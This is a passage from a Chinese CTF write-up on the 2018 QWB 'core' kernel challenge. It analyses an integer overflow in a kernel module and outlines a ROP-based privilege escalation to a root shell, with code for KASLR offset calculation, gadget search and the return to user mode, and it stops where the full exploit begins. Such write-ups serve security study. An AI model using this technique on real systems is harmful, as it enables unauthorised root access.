非图形化启动，使用命令行</span></span><br></pre></td></tr></table></figure>\n\n<p>解压``core.cpio<code>，查看</code>init`文件（初始化的过程）：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 挂载文件系统</span></span><br><span class=\"line\">mount -t proc proc /proc</span><br><span class=\"line\">mount -t sysfs sysfs /sys</span><br><span class=\"line\">mount -t devtmpfs none /dev</span><br><span class=\"line\">/sbin/mdev -s</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /dev/pts</span><br><span class=\"line\">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 666 /dev/ptmx</span><br><span class=\"line\"><span class=\"comment\"># 复制了一份符号表</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class=\"line\"><span class=\"comment\"># 网络配置</span></span><br><span class=\"line\">ifconfig eth0 up</span><br><span class=\"line\">udhcpc -i eth0</span><br><span class=\"line\">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class=\"line\">route add default gw 10.0.2.2 </span><br><span class=\"line\"><span class=\"comment\"># 加载了core.ko模块</span></span><br><span class=\"line\">insmod /core.ko</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定时关机</span></span><br><span class=\"line\">poweroff -d 120 -f &amp;</span><br><span class=\"line\">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;sh end!\\n&#x27;</span></span><br><span class=\"line\">umount /proc</span><br><span class=\"line\">umount /sys</span><br><span class=\"line\"></span><br><span class=\"line\">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>\n\n<p>checksec一下<code>core.ko</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnTrain/StrongWeb2018core/core_give/give_to_player/core/core.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br></pre></td></tr></table></figure>\n\n<p>扔到IDA逆一下，<code>init_module</code>是这个模块的初始化工作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">init_module</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  core_proc = proc_create(<span class=\"string\">&quot;core&quot;</span>, <span class=\"number\">0666LL</span>, <span class=\"number\">0LL</span>, &amp;core_fops);</span><br><span class=\"line\">  printk(&amp;unk_2DE);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个模块一开始就会创建一个自己的进程，使用的是<code>core_fops</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> proc_dir_entry *<span class=\"title function_\">proc_create</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *name, <span class=\"type\">mode_t</span> mode, <span class=\"keyword\">struct</span> proc_dir_entry *parent, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> file_operations *proc_fops)</span>;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>name就是要创建的文件名。</li>\n<li><strong>mode是文件的访问权限，以UGO的模式表示。</strong><ul>\n<li>UGO：使用三组字符串(或数字)表示属用户，属组和其他用户的rwx权限：r=4,w=2,x=1(因此777就是rwxrwxrwx)</li>\n</ul>\n</li>\n<li><strong>parent与proc_mkdir中的parent类似。也是父文件夹的proc_dir_entry对象</strong>。</li>\n<li>proc_fops就是该文件的操作函数了。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0000000000000420 40 05 00 00 00 00 00 00       core_fops dq offset __this_module       ; DATA XREF: init_module↑o</span><br><span class=\"line\">.data:0000000000000428 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000430 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000438 11 00 00 00 00 00 00 00       dq offset core_write</span><br><span class=\"line\">.data:0000000000000440 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000448 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000450 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000458 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000460 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000468 5F 01 00 00 00 00 00 00       dq offset core_ioctl</span><br></pre></td></tr></table></figure>\n\n<p><code>core_fops</code>中有<code>core_write</code>、<code>core_ioctl</code>和<code>core_release</code>三个函数。</p>\n<p><code>core_release</code>仅输出一段字符串，没有利用价值。</p>\n<p><code>core_write</code>会将一段用户空间的数据(最多0x800byte)，写入<code>bss</code>的<code>name</code>处。</p>\n<p><code>core_ioctl</code>会根据请求码选择不同的操作，可以调用<code>core_read</code>将栈上偏移<code>off</code>的数据写入用户空间，可以设置<code>off</code>，也可以调用<code>core_copy_func</code>。</p>\n<p>在<code>core_copy_func</code>会将<code>bss</code>中的<code>name</code>复制到栈上，其中有一个<strong>整数溢出</strong>，可以通过<strong>负数</strong>绕过检查并实现栈溢出。</p>\n<p>补充一下相关的内容：<code>core_fops</code>是一个<code>file_operations</code>的结构体，通过覆盖其中的内容来修改用户层调用时，该内核模块中执行的函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">module</span> *<span class=\"title\">owner</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> (*llseek) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*read) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">char</span> __user *, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*write) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">const</span> <span class=\"type\">char</span> __user *, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*read_iter) (<span class=\"keyword\">struct</span> kiocb *, <span class=\"keyword\">struct</span> iov_iter *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*write_iter) (<span class=\"keyword\">struct</span> kiocb *, <span class=\"keyword\">struct</span> iov_iter *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iopoll)(<span class=\"keyword\">struct</span> kiocb *kiocb, <span class=\"keyword\">struct</span> io_comp_batch *,</span><br><span class=\"line\">\t\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iterate) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> dir_context *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iterate_shared) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> dir_context *);</span><br><span class=\"line\">\t<span class=\"type\">__poll_t</span> (*poll) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> poll_table_struct *);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*unlocked_ioctl) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*compat_ioctl) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*mmap) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> vm_area_struct *);</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> mmap_supported_flags;</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*open) (<span class=\"keyword\">struct</span> inode *, <span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*flush) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">fl_owner_t</span> id);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*release) (<span class=\"keyword\">struct</span> inode *, <span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fsync) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span> datasync);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fasync) (<span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*lock) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file_lock *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*sendpage) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> page *, <span class=\"type\">int</span>, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"title function_\">long</span> <span class=\"params\">(*get_unmapped_area)</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>)</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*check_flags)(<span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*flock) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file_lock *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*splice_write)(<span class=\"keyword\">struct</span> pipe_inode_info *, <span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span> *, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*splice_read)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span> *, <span class=\"keyword\">struct</span> pipe_inode_info *, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*setlease)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">long</span>, <span class=\"keyword\">struct</span> file_lock **, <span class=\"type\">void</span> **);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*fallocate)(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">int</span> mode, <span class=\"type\">loff_t</span> offset,</span><br><span class=\"line\">\t\t\t  <span class=\"type\">loff_t</span> len);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*show_fdinfo)(<span class=\"keyword\">struct</span> seq_file *m, <span class=\"keyword\">struct</span> file *f);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> CONFIG_MMU</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> (*mmap_capabilities)(<span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*copy_file_range)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"keyword\">struct</span> file *,</span><br><span class=\"line\">\t\t\t<span class=\"type\">loff_t</span>, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> (*remap_file_range)(<span class=\"keyword\">struct</span> file *file_in, <span class=\"type\">loff_t</span> pos_in,</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">struct</span> file *file_out, <span class=\"type\">loff_t</span> pos_out,</span><br><span class=\"line\">\t\t\t\t   <span class=\"type\">loff_t</span> len, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> remap_flags);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fadvise)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span>);</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n\n<p>在<code>core_fops</code>中修改了内核中<code>write</code>的指向，在用户层调用<code>write</code>函数最终就会调用到这个内核模块中定义的<code>core_write</code>。</p>\n<p>经过上面的分析，我们可以有一个大概的思路：</p>\n<p><code>查找关键函数地址计算偏移 --&gt; 利用core_read泄露Canary--&gt; 在name中构建ROP chain --&gt; 利用core_copy_func的栈溢出执行ROP链 --&gt; 获取root权限并返回用户态获取root shell</code></p>\n<h3 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h3><h4 id=\"对抗KASLR\"><a href=\"#对抗KASLR\" class=\"headerlink\" title=\"对抗KASLR\"></a>对抗KASLR</h4><p>在<code>start.sh</code>中就可以看到，这道题开启了<code>KASLR</code>保护，这和<code>ASLR</code>是类似的，都是一种地址随机化技术，我们可以在获取地址后<strong>计算偏移</strong>来绕过。但对于没有相关经验的我来说，怎么计算偏移是一个问题，查阅资料后发现，这需要利用到vmlinux文件。</p>\n<p>在linux系统中，vmlinux（vmlinuz）是一个包含linux kernel的<strong>静态链接的可执行文件</strong>，文件类型可能是linux接受的可执行文件格式之一（ELF、COFF或a.out），vmlinux若要用于调试时则必须要在引导前增加symbol table</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>用于调试，但需要包含调试信息</li>\n<li>编译出来的内核原始文件，可以被用来制作后面zImage，bzImage等启动Image</li>\n<li>UBoot不能直接使用vmlinux</li>\n</ul>\n<p><strong>相关内容：</strong></p>\n<ul>\n<li>vmlinux是ELF文件。是编译出来的最原始的文件</li>\n<li>vmlinuz是被压缩的linux内核，是可以被引导的</li>\n<li>vmlinuz是一个统称。有两种详细的表现形式：zImage和bzImage(big zImage)。</li>\n<li>zImage是vmlinuz经过gzip压缩后的文件，适用于小内核</li>\n<li>bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核</li>\n</ul>\n<p>简单的说，<strong>vmlinux就是一个被压缩的<code>kernel</code>，是一个静态的ELF文件</strong>。我们可以在vmlinux的<code>.text</code>段中查看到这个kernel的<strong>所有函数地址(其基地址为vmlinux的基地址)<strong>，而这些地址都是</strong>静态的</strong>。</p>\n<blockquote>\n<p><strong>无论是找gadget还是找函数地址一定要在对应的vmlinux中找，本地的在kernel用的<code>.cpio</code>中的vmlinux中，远程的在给的vmlinux（可以看作libc）</strong></p>\n</blockquote>\n<p>因此，我们可以通过readelf查找<code>.text</code>段的基地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -t vmlinux</span><br></pre></td></tr></table></figure>\n\n<p>可以通过pwntools的ELF模块找到其中的地址，从而算出<strong>函数到基地址的偏移</strong>。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./vmlinux&#x27;</span>)</span><br><span class=\"line\">vmbase=<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">commit_offset=elf.symbols[<span class=\"string\">&#x27;commit_creds&#x27;</span>]-vmbase</span><br><span class=\"line\">prepare_offset=elf.symbols[<span class=\"string\">&#x27;prepare_kernel_cred&#x27;</span>]-vmbase</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;commit_offset: &quot;</span>+<span class=\"built_in\">hex</span>(commit_offset))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;prepare_offset: &quot;</span>+<span class=\"built_in\">hex</span>(prepare_offset))</span><br></pre></td></tr></table></figure>\n\n<p>但这还没有结束，我们需要获取运行中kernel的真实地址，才能计算出内核的基地址。</p>\n<p>在init中有下面的一段，将符号表复制到了<code>/tmp/kallsyms</code>中，通过读取符号表的内容，我们可以获取到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的真实地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 复制了一份符号表</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br></pre></td></tr></table></figure>\n\n<p>符号表分为<code>地址、类型、函数名</code>三列，读取每一项后比对函数名就可以找到真实地址，这里用了<code>fscanf</code>函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fscanf</span><span class=\"params\">(FILE *stream, <span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span></span><br><span class=\"line\"><span class=\"comment\">//返回值为读取的个数</span></span><br><span class=\"line\"><span class=\"comment\">//读取地址</span></span><br><span class=\"line\"><span class=\"title function_\">fscanf</span><span class=\"params\">(symbols_table, <span class=\"string\">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>读到真实地址后，用<code>真实地址-偏移</code>即可得到运行中kernel的基地址，借此我们可以计算出<strong>两个基地址之间的偏移</strong>。</p>\n<h4 id=\"获取gadget\"><a href=\"#获取gadget\" class=\"headerlink\" title=\"获取gadget\"></a>获取gadget</h4><p>获取gadget同样需要利用vmlinux，可以直接使用<code>ROPgadget</code>来搜，不过这样分析一次vmlinux的时间挺长的，可以先把所有gadget搜出来，然后再用grep找。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary vmlinux &gt; gadget</span><br><span class=\"line\"><span class=\"built_in\">cat</span> gadget | grep <span class=\"string\">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>对于找不到的gadget，可以用pwntools</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./vmlinux&quot;</span>)</span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span> <span class=\"comment\"># 记得设置arch，不然找不到</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(elf.search(asm(<span class=\"string\">&#x27;iretq&#x27;</span>)).__next__()))</span><br></pre></td></tr></table></figure>\n\n<p>执行<code>commit_creds(prepare_kernel_cred(0))</code>的时候，因为返回值存在<code>rax</code>，因此我们需要<code>mov rdi, rax ;</code>之后再<code>commit_creds()</code>。</p>\n<p>这里找不到<code>mov rdi, rax ; ret</code>的gadget，因此用<code>mov rdi, rax; call rdx</code>来替代，所以要提前设置好<code>rdx</code>。除此之外，<code>call rdx</code>会将<code>rdx</code><strong>指向指令的下一条指令（地址上）入栈</strong>，这会让rop链断开，因此<code>rdx</code>指向的指令需要把这个入栈的指令除掉，并通过<code>ret</code>接上rop链，这里用的是<code>pop rcx; ret</code>。</p>\n<h4 id=\"返回用户态\"><a href=\"#返回用户态\" class=\"headerlink\" title=\"返回用户态\"></a>返回用户态</h4><p>为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值，这个函数应该首先被执行：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Status has been saved.\\033[0m&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而在返回用户态时，只需要在栈中构造好保存的用户状态，执行<code>swapg; iretq</code>就能返回用户态。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//最后的栈布局，用于返回用户态</span></span><br><span class=\"line\">↓   swapgs</span><br><span class=\"line\">    iretq</span><br><span class=\"line\">    user_shell_addr <span class=\"comment\">// get shell函数的地址</span></span><br><span class=\"line\">    user_cs</span><br><span class=\"line\">    user_eflags <span class=\"comment\">//64bit user_rflags</span></span><br><span class=\"line\">    user_sp</span><br><span class=\"line\">    user_ss</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h4><ul>\n<li><p>做题时最好首先file一下确认文件类型，如果不是cpio文件则在本地调试时应按照原先的打包方式打包回去，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。</p>\n</li>\n<li><p>如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。</p>\n</li>\n<li><p>在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：<code>qemu-system-x86_64: -s: Failed to find an available port: Address already in use</code>。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用<code>lsof -i tcp:&lt;port&gt;</code>命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入<code>lsof -i tcp:1234</code>，找到占用的pid将其kill即可：<code>kill &lt;pid&gt;</code></p>\n</li>\n</ul>\n<h4 id=\"gdb调试\"><a href=\"#gdb调试\" class=\"headerlink\" title=\"gdb调试\"></a>gdb调试</h4><p>和用户态调试不同，kernel的调试需要我们attach到qemu开放的端口</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gdb</span><br><span class=\"line\">file vmlinux <span class=\"comment\"># 载入符号信息</span></span><br><span class=\"line\">target remote localhost:1234 <span class=\"comment\"># -s 默认为1234端口</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在本地调试的时候可以先用root调试，获取进程的基地址方便下断点</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># qemu里获取基地址，通常基址的偏移相同，需要在gdb attach之前进行</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.text</span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.data</span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.bss</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在gdb中设置基地址</span></span><br><span class=\"line\">add-symbol-file ./xxx.ko text_base -s .data data_base -s .bss bss_base </span><br></pre></td></tr></table></figure>\n\n<p>修改为root</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class=\"line\">=&gt; setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 